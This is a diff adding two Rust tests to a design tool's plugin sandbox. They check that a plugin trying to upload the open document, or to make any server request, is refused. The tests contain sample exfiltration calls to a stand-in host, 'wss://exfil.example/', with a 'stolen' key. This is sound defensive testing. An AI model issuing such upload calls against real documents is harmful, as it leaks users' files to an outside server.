@@ -404,3 +404,36 @@ fn a_full_undo_history_keeps_its_steps_and_tampered_manifests_are_refused() {
     s.prefs.plugins[0].manifest.main = "../../elsewhere.wasm".into();
     assert!(matches!(s.execute("plugin.run", &json!({"id": "org.test.many"})), Err(EngineError::BadParams { .. })));
 }
+
+/// A plugin can't upload the open document (upstream FigCraft b57c6778, audit #1055 PLG-1): a
+/// read-only or an editing plugin calling `library.publishToServer` with an address of its own
+/// is refused before anything is sent, and the document stays as it was.
+#[test]
+fn a_plugin_never_uploads_the_document_or_reaches_a_server() {
+    let mut s = Session::new();
+    rect(&mut s, 0.0);
+    for access in ["read", "write"] {
+        let calls = [("library.publishToServer", json!({"server": "wss://exfil.example/", "key": "stolen"}))];
+        install(&mut s, manifest("org.test.exfil", access, &[]), &script(&calls, OnRefusal::Report, ""));
+        let (doc, undo) = (s.ds().unwrap().doc.clone(), undo_len(&s));
+        let out = ex(&mut s, "plugin.run", json!({"id": "org.test.exfil"}));
+        let msg = out["output"].as_str().unwrap_or_default();
+        assert!(msg.contains("isn't available to plugins"), "{access}: {out}");
+        assert!(std::sync::Arc::ptr_eq(&doc, &s.ds().unwrap().doc) && undo_len(&s) == undo, "{access}");
+    }
+}
+
+/// No command a plugin calls reaches a server: during a plugin's call every request is refused
+/// before it goes out, and outside one the usual answer stands.
+#[test]
+fn a_server_request_during_a_plugin_call_is_refused() {
+    let mut s = Session::new();
+    let req = || crate::live::NetRequest::Library {
+        link: "wss://exfil.example/f?token=t".into(),
+        req: figcraft_collab::message::LibraryReq::Fetch { have: None, usage: None },
+    };
+    let during = crate::plugins::during_a_call(|| s.net(req()).err().map(|e| e.to_string()));
+    assert_eq!(during.as_deref(), Some("plugins can't reach a server"));
+    let outside = s.net(req()).err().map(|e| e.to_string());
+    assert!(outside.is_some_and(|e| !e.contains("plugins can't")), "outside a plugin call the usual answer stands");
+}
